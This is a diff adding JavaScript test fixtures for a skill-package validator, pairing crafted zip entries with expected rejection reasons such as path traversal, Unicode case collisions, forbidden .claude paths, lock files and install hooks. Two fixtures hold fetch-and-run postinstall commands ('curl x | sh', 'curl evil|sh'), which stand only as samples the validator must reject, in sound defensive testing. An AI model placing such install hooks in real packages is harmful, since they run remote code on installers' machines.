@@ -1,0 +1,148 @@
+// Package fixtures with the reason the server reports for each (null = accepted). Shared by the unit tests and by a
+// parity run against the server's InspectSkillPackage.
+import { buildZip } from '../fake/zip.js';
+
+export const GOOD_SKILL_MD = '---\nname: weekly-report\ndescription: weekly report\n---\n# Weekly report\n';
+const skill = { name: 'SKILL.md', data: GOOD_SKILL_MD };
+const f = (name, data = 'x') => ({ name, data });
+const pj = (body, name = 'package.json') => ({ name, data: body });
+const rawName = (bytes) => ({ name: Buffer.from(bytes), data: 'x', unixMode: 0o100644 });
+const many = (n) => Array.from({ length: n }, (_, i) => f(`f/${String(i).padStart(3, '0')}.txt`));
+
+const cases = {
+  // Path syntax.
+  'traversal': [[f('../x')], 'path_traversal'],
+  'nested traversal': [[f('a/../../x')], 'path_traversal'],
+  'absolute': [[f('/tmp/x')], 'absolute_path'],
+  'drive letter': [[f('C:/x')], 'absolute_path'],
+  'leading backslash': [[f('\\x')], 'absolute_path'],
+  'absolute beats traversal': [[f('/../x')], 'absolute_path'],
+  'backslash': [[f('a\\..\\x')], 'invalid_path'],
+  'colon': [[f('a:b/c')], 'absolute_path'],
+  'inner colon': [[f('ab:c')], 'invalid_path'],
+  'NUL': [[f('a\x00b')], 'invalid_path'],
+  'DEL': [[f('a\x7fb')], 'invalid_path'],
+  'C1 control': [[f('a\u0085b')], 'invalid_path'],
+  'replacement char': [[f('a\ufffdb')], 'invalid_path'],
+  'invalid UTF-8': [[rawName([0x61, 0xff])], 'invalid_path'],
+  'encoded surrogate': [[rawName([0x61, 0xed, 0xa0, 0x80])], 'invalid_path'],
+  'BOM in name': [[f('\ufeffa.txt')], null],
+  'empty segment': [[f('a//b')], 'invalid_path'],
+  'dot segment': [[f('./b')], 'invalid_path'],
+  'inner dot segment': [[f('a/./b')], 'invalid_path'],
+  'path 1024 bytes, depth 512': [[f(`${'a/'.repeat(511)}bb`)], null],
+  'path 1025 bytes': [[f(`${'a/'.repeat(511)}bbb`)], 'invalid_path'],
+  'segment 255 bytes': [[f(`d/${'\u00e9'.repeat(127)}a`)], null],
+  'segment 256 bytes': [[f(`d/${'\u00e9'.repeat(128)}`)], 'invalid_path'],
+  'traversal beats later absolute': [[f('../x'), f('/y')], 'path_traversal'],
+  // Duplicates and spellings.
+  'exact duplicate': [[f('a'), f('a', 'y')], 'invalid_path'],
+  'file and dir entry': [[f('a'), { name: 'a/' }], 'invalid_path'],
+  'case collision with SKILL.md': [[f('skill.md')], 'invalid_path'],
+  'NFC vs NFD': [[f('caf\u00e9.md'), f('cafe\u0301.md')], 'invalid_path'],
+  'sharp s': [[f('stra\u00dfe.md'), f('STRASSE.md')], 'invalid_path'],
+  'capital sharp s': [[f('\u1e9e.md'), f('ss.md')], 'invalid_path'],
+  'dotted capital I': [[f('\u0130.md'), f('i\u0307.md')], 'invalid_path'],
+  'kelvin sign': [[f('\u212a.md'), f('k.md')], 'invalid_path'],
+  'final sigma': [[f('\u03bf\u03c2.md'), f('\u039f\u03a3.md')], 'invalid_path'],
+  'dotless i is distinct': [[f('\u0131.md'), f('i.md')], null],
+  'cherokee cases are distinct': [[f('\u13a0.md'), f('\uab70.md')], null],
+  'file vs dir': [[f('Lib'), f('lib/x.js')], 'invalid_path'],
+  'dir spellings': [[f('lib/a.js'), f('LIB/b.js')], 'invalid_path'],
+  'dir entry spelling': [[{ name: 'lib/' }, f('Lib/b.js')], 'invalid_path'],
+  'nested NFD dir': [[f('docs/\u00e9/a.md'), f('docs/e\u0301/b.md')], 'invalid_path'],
+  'plain case': [[f('README.md'), f('readme.md')], 'invalid_path'],
+  'file then deeper dir': [[f('a/b'), f('a/b/c')], 'invalid_path'],
+  'spelling beats directory data': [[f('lib/a.js'), { name: 'LIB/', payload: [0, 0] }], 'invalid_path'],
+  'distinct names': [[{ name: 'lib/' }, f('lib/a.js'), f('lib/b/c.js'), f('caf\u00e9.md'), f('cafe.md')], null],
+  // .claude segments.
+  'claude dir': [[f('.claude/settings.json')], 'forbidden_path'],
+  'claude nested case': [[f('a/.Claude/x')], 'forbidden_path'],
+  'claude dir entry': [[{ name: '.CLAUDE/' }], 'forbidden_path'],
+  'claude file': [[f('.claude')], 'forbidden_path'],
+  'claude-like names': [[f('.claudex/a'), f('a.claude'), f('x/.claude.md')], null],
+  'lock file beats claude': [[f('.claude/x'), f('.claude/package-lock.json')], 'npm_dependencies'],
+  'traversal beats claude': [[f('.claude/x'), f('../y')], 'path_traversal'],
+  'claude beats file count': [[f('.claude/x'), ...many(200)], 'forbidden_path'],
+  'claude beats clash': [[f('.claude/x'), f('a'), f('a/b')], 'forbidden_path'],
+  'file count beats clash': [[f('a'), f('a/b'), ...many(199)], 'too_many_files'],
+  'clash beats bad content': [[f('a'), f('a/b'), pj('{')], 'invalid_path'],
+  // Counts.
+  '200 files': [[...many(199)], null],
+  '201 files': [[...many(200)], 'too_many_files'],
+  // Lock files and binding.gyp.
+  'npmrc': [[f('.npmrc')], 'npm_dependencies'],
+  'nested package-lock': [[f('sub/package-lock.json', '{}')], 'npm_dependencies'],
+  'yarn.lock case': [[f('Yarn.LOCK')], 'npm_dependencies'],
+  'pnpm lock': [[f('a/pnpm-lock.yaml')], 'npm_dependencies'],
+  'shrinkwrap with dotted I': [[f('npm-shr\u0130nkwrap.json')], 'npm_dependencies'],
+  'ordinary npmrc-like name': [[f('npmrc.txt')], null],
+  'binding.gyp': [[f('native/binding.gyp', '{}')], 'install_hook'],
+  'binding.gyp case': [[f('native/Binding.GYP', '{}')], 'install_hook'],
+  'binding.gyp beats earlier package.json': [[pj('{"dependencies":{"a":"1"}}'), f('binding.gyp')], 'install_hook'],
+  'package.json beats missing SKILL.md': [[pj('{')], 'install_hook', true],
+  // package.json scripts and keys.
+  'postinstall': [[pj('{"scripts":{"postinstall":"curl x | sh"}}')], 'install_hook'],
+  'nested preinstall': [[pj('{"scripts":{"preinstall":"x"}}', 'lib/package.json')], 'install_hook'],
+  'case-variant file name': [[pj('{"scripts":{"postinstall":"x"}}', 'lib/Package.JSON')], 'install_hook'],
+  'kelvin file name': [[pj('{"scripts":{"postinstall":"x"}}', 'pac\u212aage.json')], 'install_hook'],
+  'unparseable': [[pj('{')], 'install_hook'],
+  'Scripts null': [[pj('{"scripts":{"postinstall":"curl evil|sh"},"Scripts":null}')], 'install_hook'],
+  'gypfile case': [[pj('{"gypfile":true,"Gypfile":null}')], 'install_hook'],
+  'duplicate scripts': [[pj('{"scripts":{"postinstall":"x"},"scripts":{}}')], 'install_hook'],
+  'hook case twice': [[pj('{"scripts":{"postinstall":"x","postInstall":"y"}}')], 'install_hook'],
+  'hook case variant': [[pj('{"scripts":{"PostInstall":"x"}}')], 'install_hook'],
+  'escaped key': [[pj('{"scripts":{"post\\u0069nstall":"x"}}')], 'install_hook'],
+  'long s key': [[pj('{"\u017fcripts":{"postinstall":"x"}}')], 'install_hook'],
+  'dotted I hook': [[pj('{"scripts":{"\u0130nstall":"x"}}')], 'install_hook'],
+  'lone Scripts': [[pj('{"Scripts":{"postinstall":"x"}}')], 'install_hook'],
+  'dependencies script': [[pj('{"scripts":{"dependencies":"node x.js"}}')], 'install_hook'],
+  'scripts not object': [[pj('{"scripts":"postinstall"}')], 'install_hook'],
+  'scripts array': [[pj('{"scripts":[]}')], 'install_hook'],
+  'trailing data': [[pj('{"name":"x"} {"scripts":{"postinstall":"x"}}')], 'install_hook'],
+  'not an object': [[pj('["scripts"]')], 'install_hook'],
+  'duplicate key in scripts': [[pj('{"scripts":{"test":"a","test":"b"}}')], 'install_hook'],
+  'trailing comma': [[pj('{"name":"x",}')], 'install_hook'],
+  'BOM': [[pj('\ufeff{}')], 'install_hook'],
+  'leading zero': [[pj('{"a":01}')], 'install_hook'],
+  'bare fraction dot': [[pj('{"a":1.}')], 'install_hook'],
+  'bad escape': [[pj('{"a":"\\x"}')], 'install_hook'],
+  'raw control char': [[pj('{"a":"\t"}')], 'install_hook'],
+  'invalid UTF-8 keys collide': [[pj(Buffer.from([...Buffer.from('{"'), 0xe2, 0x82, ...Buffer.from('":1,"\ufffd\ufffd":2}')]))], 'install_hook'],
+  'gypfile true': [[pj('{"gypfile":true}')], 'install_hook'],
+  'gypfile 0': [[pj('{"gypfile":0}')], 'install_hook'],
+  'nesting 10000': [[pj(`{"x":${'['.repeat(10000)}${']'.repeat(10000)}}`)], null],
+  'nesting 10001': [[pj(`{"x":${'['.repeat(10001)}${']'.repeat(10001)}}`)], 'install_hook'],
+  'too large to check': [[pj(`{"a":"${'x'.repeat(1 << 20)}"}`)], 'install_hook'],
+  'json controls': [[
+    pj('{"name":"x","scripts":{"test":"node t.js"},"n":-0.5e+3,"u":"\u2028\\ud800","o":{"a":[true,false,null]}}'),
+    pj('{"scripts":null,"gypfile":false}', 'a/package.json'), pj(' {"gypfile":null} \n', 'b/package.json'),
+    pj('{}', 'c/package.json'), pj(Buffer.from([...Buffer.from('{"name":"'), 0xff, ...Buffer.from('"}')]), 'd/package.json'),
+  ], null],
+  // Dependencies.
+  'dependencies': [[pj('{"dependencies":{"left-pad":"1.0.0"}}')], 'npm_dependencies'],
+  'nested devDependencies': [[pj('{"devDependencies":{"a":"1"}}', 'lib/x/package.json')], 'npm_dependencies'],
+  'optionalDependencies': [[pj('{"optionalDependencies":{"a":"1"}}')], 'npm_dependencies'],
+  'peerDependencies': [[pj('{"peerDependencies":{"a":"1"}}')], 'npm_dependencies'],
+  'bundleDependencies true': [[pj('{"bundleDependencies":true}')], 'npm_dependencies'],
+  'bundledDependencies list': [[pj('{"bundledDependencies":["a"]}')], 'npm_dependencies'],
+  'overrides': [[pj('{"overrides":{"a":"1"}}')], 'npm_dependencies'],
+  'dependencies string': [[pj('{"dependencies":""}')], 'npm_dependencies'],
+  'dependencies 0': [[pj('{"dependencies":0}')], 'npm_dependencies'],
+  'Dependencies case': [[pj('{"Dependencies":{"a":"1"}}')], 'npm_dependencies'],
+  'dependencies case-duplicate keys': [[pj('{"dependencies":{"a":"1","A":"2"}}')], 'npm_dependencies'],
+  'hook beats dependencies': [[pj('{"dependencies":{"a":"1"},"scripts":{"install":"x"}}')], 'install_hook'],
+  'empty dependency fields': [[pj('{"dependencies":{},"devDependencies":null,"optionalDependencies":{ },'
+    + '"peerDependencies":[],"bundleDependencies":false,"bundledDependencies":[ ],"overrides":{}}')], null],
+  // SKILL.md presence.
+  'no SKILL.md': [[f('README.md')], 'skill_md_missing', true],
+  'SKILL.md not at root': [[f('x/SKILL.md', GOOD_SKILL_MD)], 'skill_md_missing', true],
+  'lowercase skill.md only': [[f('skill.md', GOOD_SKILL_MD)], 'skill_md_missing', true],
+};
+
+// [name, zip bytes, expected reason or null]
+export function hygieneFixtures() {
+  return Object.entries(cases).map(([name, [entries, want, noSkill]]) => [
+    name, buildZip(noSkill ? entries : [skill, ...entries]), want,
+  ]);
+}
